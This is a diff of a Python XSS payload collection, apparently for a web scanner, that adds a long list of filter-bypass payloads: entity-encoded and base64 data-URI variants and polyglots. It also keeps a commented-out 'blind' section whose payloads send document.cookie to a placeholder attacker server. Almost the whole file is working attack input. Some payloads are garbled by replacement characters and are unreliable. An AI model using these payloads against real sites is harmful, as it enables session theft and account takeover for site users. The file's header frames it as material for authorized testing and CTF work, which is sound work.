@@ -1,6 +1,11 @@
-# Ganti dengan server kamu (XSS Hunter, Burp Collaborator, dll)
+# ==============================================================================
+# XSS Payload Collection
+# For authorized security testing, bug bounty, CTF, and lab environments only.
+# ==============================================================================
+
 YOUR_SERVER = "https://YOUR_SERVER.com"
 
+# --- REFLECTED ---
 REFLECTED = [
     "<script>alert(1)</script>",
     "'\"><script>alert(1)</script>",
@@ -48,8 +53,16 @@ REFLECTED = [
     "'onmouseover=alert(1) x='",
     "<a onmouseover=alert(1)>hover</a>",
     "<a href=# onclick=alert(1)>click</a>",
+    # --- from raw list ---
+    "<ScRipT>alert(123);</ScRipT>",
+    "<script>alert(\"hellox worldss\");</script>",
+    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
+    "<img src=asdf onerror=alert(document.cookie)>",
+    "<video src=1 onerror=alert(1)>",
+    "<audio src=1 onerror=alert(1)>",
 ]
 
+# --- STORED ---
 STORED = [
     "<img src=x onerror=alert(1)>",
     "<svg onload=alert(1)>",
@@ -99,6 +112,7 @@ STORED = [
     "<article onmouseover=alert(1)>hover</article>",
 ]
 
+# --- DOM ---
 DOM = [
     "<img src=x onerror=alert(document.cookie)>",
     "javascript:alert(1)",
@@ -134,8 +148,22 @@ DOM = [
     "<script>setTimeout(function(){alert(document.domain)},0)</script>",
     "javascript:alert(window.name)",
     "javascript:alert(document.referrer)",
+    "&lt;",
+    "%3C",
+    "&lt;",
+    "&LT;",
+    "&#60;",
+    "&#060;",
+    "&#0060;",
+    "&#00060;",
+    "&#x3c;",
+    "&#x03c;",
+    "&#x003c;",
+    "\x3c",
+    "\u003c",
 ]
 
+# --- BYPASS ---
 BYPASS = [
     "<ScRiPt>alert(1)</ScRiPt>",
     "<script>alert`1`</script>",
@@ -161,7 +189,7 @@ BYPASS = [
     "<script>alert(1)</script >",
     "<script>alert(1)</script/>",
     "<script charset=\"utf-8\">alert(1)</script>",
-    "<script>al\u0065rt(1)</script>",
+    "<script>al\\u0065rt(1)</script>",
     "<script>\\u0061lert(1)</script>",
     "<script>\\x61lert(1)</script>",
     "<svg onload=\"javascript:alert(1)\">",
@@ -176,8 +204,8 @@ BYPASS = [
     "<script>alert(1)&#10;</script>",
     "<script>alert(1)&#13;</script>",
     "<script>alert(1)&#9;</script>",
-    "\"><script>al\u0065rt(1)</script>",
-    "'><script>al\u0065rt(1)</script>",
+    "\"><script>al\\u0065rt(1)</script>",
+    "'><script>al\\u0065rt(1)</script>",
     "<img/src/onerror=alert(1)>",
     "<img/onerror=alert(1) src=x>",
     "<svg/onload =alert(1)>",
@@ -186,8 +214,17 @@ BYPASS = [
     "<script>window.alert(1)</script>",
     "<script>parent.alert(1)</script>",
     "<script>frames.alert(1)</script>",
+    # from raw list
+    "<sVg><scRipt>alert(1)</scRipt>",
+    "<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00>",
+    "<svg><style>{font-family:'<iframe/onload=confirm(1)>'}",
+    "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\">",
+    "<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT>",
+    "<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
+    "<meta content=\"&NewLine;1&NewLine;;JAVASCRIPT&colon;alert(1)\" http-equiv=\"refresh\"/>",
 ]
 
+# --- FILTERED ---
 FILTERED = [
     "<ScRiPt>alert(1)</ScRiPt>",
     "scr<script>ipt>alert(1)</scr</script>ipt>",
@@ -236,6 +273,7 @@ FILTERED = [
     "<script> alert(1) </script>",
 ]
 
+# --- DOM-BASED ---
 DOM_BASED = [
     "javascript:alert(1)",
     "javascript:alert(document.domain)",
@@ -269,6 +307,7 @@ DOM_BASED = [
     "vbscript:alert(1)",
 ]
 
+# --- POLYGLOT ---
 POLYGLOT = [
     "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>,",
     "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'\">--!><script>alert(1)</script>",
@@ -301,7 +340,89 @@ POLYGLOT = [
     "\">><script>alert(1)</script>",
     "<img src=x oneonerrorrror=alert(1)>",
 ]
-
+MORE = [ 
+    '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
+    '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>',
+    """javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>""",
+    "<script>alert(123);</script>",
+    "<ScRipT>alert(\"XSS\");</ScRipT>",
+    "<script>alert(123)</script>",
+    "<script>alert(\"hellox worldss\");</script>",
+    "<script>alert(�XSS�)</script>",
+    "<script>alert(�XSS�);</script>",
+    "<script>alert(�XSS�)</script>",
+    "�><script>alert(�XSS�)</script>",
+    "<script>alert(/XSS�)</script>",
+    "<script>alert(/XSS/)</script>",
+    "</script><script>alert(1)</script>",
+    "�; alert(1);",
+    "�)alert(1);//",
+    "<ScRiPt>alert(1)</sCriPt>",
+    "<IMG SRC=jAVasCrIPt:alert(�XSS�)>",
+    "<IMG SRC=�javascript:alert(�XSS�);�>",
+    "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
+    "<IMG SRC=javascript:alert(�XSS�)>",
+    "<img src=xss onerror=alert(1)>",
+    "<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00>",
+    "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'",
+    "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"",
+    "<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}",
+    "<img/src=`%00` onerror=this.onerror=confirm(1)",
+    "<form><isindex formaction=\"javascript&colon;confirm(1)\"",
+    "<img src=`%00`&NewLine; onerror=alert(1)&NewLine;",
+    "<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=>",
+    "<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
+    "<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*>",
+    "&#34;&#62;<h1/onmouseover='\\u0061lert(1)'>%00",
+    "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">",
+    "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>",
+    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">",
+    "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>",
+    "<form><a href=\"javascript:\\u0061lert&#x28;1&#x29;\">X",
+    "<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>",
+    "<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;>",
+    "<a href=\"data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a",
+    "<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;>XYZ</a",
+    "<img/src=@&#32;&#13; onerror = prompt('&#49;')",
+    "<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;",
+    "<script ^__^>alert(String.fromCharCode(49))</script ^__^",
+    "</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :->",
+    "&#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\">",
+    "<form><textarea &#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;'>",
+    "<script /***/>/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/</script /***/>",
+    "<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>",
+    "<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",
+    "<script ~~~>alert(0%0)</script ~~~>",
+    "<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>",
+    "<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN",
+    "&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'",
+    "&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}",
+    "<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^",
+    "<div/style=\"width:expression(confirm(1))\">X</div> {IE7}",
+    "<iframe/%00/ src=javaSCRIPT&colon;alert(1)",
+    "//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//",
+    "/*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/>",
+    "</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>",
+    "<a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\">",
+    "</plaintext\\></|\\><plaintext/onmouseover=prompt(1)",
+    "</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}",
+    "<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>",
+    "<div onmouseover='alert&lpar;1&rpar;'>DIV</div>",
+    "<iframe style=\"xg-p:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">",
+    "<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>",
+    "<var onmouseover=\"prompt(1)\">On Mouse Over</var>",
+    "<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>",
+    "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">",
+    "<%<!--'%><script>alert(1);</script -->",
+    "<iframe/src \\/\\/onload = prompt(1)",
+    "<iframe/onreadystatechange=alert(1)",
+    "<svg/onload=alert(1)",
+    "<input value=<><iframe/src=javascript:confirm(1)",
+    "<input type=\"text\" value=`` <div/onmouseover='alert(1)'>X</div>",
+    "<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>",
+]
+# --- BLIND (uncomment dan isi YOUR_SERVER dulu) ---
 # BLIND = [
 #     f"<img src=x onerror=\"this.src='{YOUR_SERVER}/?c='+document.cookie\">",
 #     f"<img src=x onerror=\"fetch('{YOUR_SERVER}/?c='+document.cookie)\">",
@@ -317,7 +438,13 @@ POLYGLOT = [
 #     f"<body onload=\"fetch('{YOUR_SERVER}/?c='+document.cookie)\">",
 # ]
 
-XSS_PAYLOADS = REFLECTED + STORED + DOM + BYPASS + FILTERED + DOM_BASED + POLYGLOT
+# --- COMBINED ---
+XSS_PAYLOADS = (
+    REFLECTED + STORED + DOM + BYPASS + FILTERED + DOM_BASED + POLYGLOT + MORE
+)
+
+# Deduplicated
+XSS_PAYLOADS = list(dict.fromkeys(XSS_PAYLOADS))
 
 XSS_BY_TYPE = {
     "reflected": REFLECTED,
@@ -327,5 +454,6 @@ XSS_BY_TYPE = {
     "filtered":  FILTERED,
     "dombased":  DOM_BASED,
     "polyglot":  POLYGLOT,
-    # "blind": BLIND,
+    "more":      MORE,
+    # "blind":   BLIND,
 }
